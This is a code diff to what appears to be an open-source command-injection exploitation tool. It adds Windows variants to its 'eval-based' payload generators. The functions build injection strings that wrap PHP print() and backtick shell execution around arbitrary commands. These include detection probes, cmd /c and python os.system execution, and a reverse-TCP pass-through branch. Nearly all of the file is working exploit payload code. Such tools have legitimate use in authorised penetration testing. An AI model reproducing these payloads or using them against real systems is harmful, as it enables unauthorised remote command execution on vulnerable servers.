@@ -14,70 +14,123 @@ the Free Software Foundation, either version 3 of the License, or
 For more see the file 'readme/COPYING' for copying permission.
 """
 
+from src.utils import settings
+
 """
-The "eval-based" injection technique on Classic OS Command Injection.
+The "eval-based" code injection technique on classic OS command injection.
 The available "eval-based" payloads.
 """
 
 """
-Eval-based decision payload (check if host is vulnerable).
+eval-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, randv1, randv2):
-  if separator == "":
-    payload = ("print(`echo " + TAG + "`." +
-                "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
-                "`echo " + TAG + "`." +
-                "`echo " + TAG + "`)%3B" +
-                separator
-              )
+  if settings.TARGET_OS == "win":
+    if separator == "":
+      payload = ("print(`echo " + TAG + "`." +
+                  "`for /f \"delims=\" %i in ('cmd /c \"" + 
+                  "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
+                  "\"') do @set /p =%i <nul`." +
+                  "`echo " + TAG + "`." +
+                  "`echo " + TAG + "`)%3B" +
+                  separator
+                )
+    else:
+      payload = ("print(`echo " + TAG + "" +
+                  separator + "for /f \"delims=\" %i in ('cmd /c \"" + 
+                  "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
+                  "\"') do @set /p =%i <nul" + "" + 
+                  separator + "echo " + TAG + "" +
+                  separator + "echo " + TAG + "`)%3B"
+                )
   else:
-    payload = ("print(`echo " + TAG + "" +
-                separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" + "" +
-                separator + "echo " + TAG + "" +
-                separator + "echo " + TAG + "`)%3B"
-              )
-    
+    if separator == "":
+      payload = ("print(`echo " + TAG + "`." +
+                  "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
+                  "`echo " + TAG + "`." +
+                  "`echo " + TAG + "`)%3B" +
+                  separator
+                )
+    else:
+      payload = ("print(`echo " + TAG + "" +
+                  separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" + "" +
+                  separator + "echo " + TAG + "" +
+                  separator + "echo " + TAG + "`)%3B"
+                )
+      
   return payload
 
 """
 __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, randv1, randv2):
-  python_payload = "python -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
-  if separator == "":
-    payload = ("print(`echo " + TAG + "`." +
-                "`" + python_payload + "`." +
-                "`echo " + TAG + "`." +
-                "`echo " + TAG + "`)%3B" +
-                separator
-              )
+  if settings.TARGET_OS == "win":
+    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
+    if separator == "":
+      payload = ("print(`echo " + TAG + "`." +
+                  "` cmd /c " + python_payload + "`." +
+                  "`echo " + TAG + "`." +
+                  "`echo " + TAG + "`)%3B" +
+                  separator
+                )
+    else:
+      payload = ("print(`echo " + TAG + "" +
+                  separator + python_payload + 
+                  separator + "echo " + TAG + "" +
+                  separator + "echo " + TAG + "`)%3B"
+                )
   else:
-    payload = ("print(`echo " + TAG + "" +
-                separator + python_payload  +
-                separator + "echo " + TAG + "" +
-                separator + "echo " + TAG + "`)%3B"
-              )
-    
+    python_payload = "python -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
+    if separator == "":
+      payload = ("print(`echo " + TAG + "`." +
+                  "` " + python_payload + "`." +
+                  "`echo " + TAG + "`." +
+                  "`echo " + TAG + "`)%3B" +
+                  separator
+                )
+    else:
+      payload = ("print(`echo " + TAG + "" +
+                  separator + python_payload  +
+                  separator + "echo " + TAG + "" +
+                  separator + "echo " + TAG + "`)%3B"
+                )
+      
   return payload
 
 """
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, TAG, cmd):
-  if separator == "":
-    payload = ("print(`echo " + TAG + "`." + 
-                "`echo " + TAG + "`." +
-                "`" + cmd + "`." +
-                "`echo " + TAG + "`." +
-                "`echo " + TAG + "`)%3B"
-              )
-  else:
-    payload = ("print(`echo '" + TAG + "'" + 
-                separator + "echo '" + TAG + "'" +
-                separator + cmd  +
-                separator + "echo '" + TAG + "'" +
-                separator + "echo '" + TAG + "'`)%3B"
-              )
+  if settings.TARGET_OS == "win":
+    if separator == "":
+      payload = ("print(`echo " + TAG + "`." + 
+                  "`echo " + TAG + "`." +
+                  "` cmd /c " + cmd + "`." +
+                  "`echo " + TAG + "`." +
+                  "`echo " + TAG + "`)%3B"
+                )
+    else:
+      payload = ("print(`echo '" + TAG + "'" + 
+                  separator + "echo '" + TAG + "'" +
+                  separator + " cmd /c " + cmd  +
+                  separator + "echo '" + TAG + "'" +
+                  separator + "echo '" + TAG + "'`)%3B"
+                )
+  else:  
+    if separator == "":
+      payload = ("print(`echo " + TAG + "`." + 
+                  "`echo " + TAG + "`." +
+                  "`" + cmd + "`." +
+                  "`echo " + TAG + "`." +
+                  "`echo " + TAG + "`)%3B"
+                )
+    else:
+      payload = ("print(`echo '" + TAG + "'" + 
+                  separator + "echo '" + TAG + "'" +
+                  separator + cmd  +
+                  separator + "echo '" + TAG + "'" +
+                  separator + "echo '" + TAG + "'`)%3B"
+                )
 
   return payload
 
@@ -85,20 +138,41 @@ def cmd_execution(separator, TAG, cmd):
 __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, TAG, cmd):
-  if separator == "":
-    payload = ("print(`echo " + TAG + "`." + 
-                "`echo " + TAG + "`." +
-                "`" + cmd + "`." +
-                "`echo " + TAG + "`." +
-                "`echo " + TAG + "`)%3B"
-              )
+  if settings.TARGET_OS == "win":
+    if settings.REVERSE_TCP:
+      payload = (separator + " " + cmd + " "
+                )
+    else:
+      python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('" +cmd+ "')\"" 
+      if separator == "":
+        payload = ("print(`echo " + TAG + "`." + 
+                    "`echo " + TAG + "`." +
+                    "` cmd /c " + python_payload + "`." +
+                    "`echo " + TAG + "`." +
+                    "`echo " + TAG + "`)%3B"
+                  )
+      else:
+        payload = ("print(`echo '" + TAG + "'" + 
+                    separator + "echo '" + TAG + "'" +
+                    separator + " cmd /c " + python_payload +
+                    separator + "echo '" + TAG + "'" +
+                    separator + "echo '" + TAG + "'`)%3B"
+                  )
   else:
-    payload = ("print(`echo '" + TAG + "'" + 
-                separator + "echo '" + TAG + "'" +
-                separator + cmd  +
-                separator + "echo '" + TAG + "'" +
-                separator + "echo '" + TAG + "'`)%3B"
-              )
+    if separator == "":
+      payload = ("print(`echo " + TAG + "`." + 
+                  "`echo " + TAG + "`." +
+                  "`" + cmd + "`." +
+                  "`echo " + TAG + "`." +
+                  "`echo " + TAG + "`)%3B"
+                )
+    else:
+      payload = ("print(`echo '" + TAG + "'" + 
+                  separator + "echo '" + TAG + "'" +
+                  separator + cmd  +
+                  separator + "echo '" + TAG + "'" +
+                  separator + "echo '" + TAG + "'`)%3B"
+                )
   return payload
 
 #eof
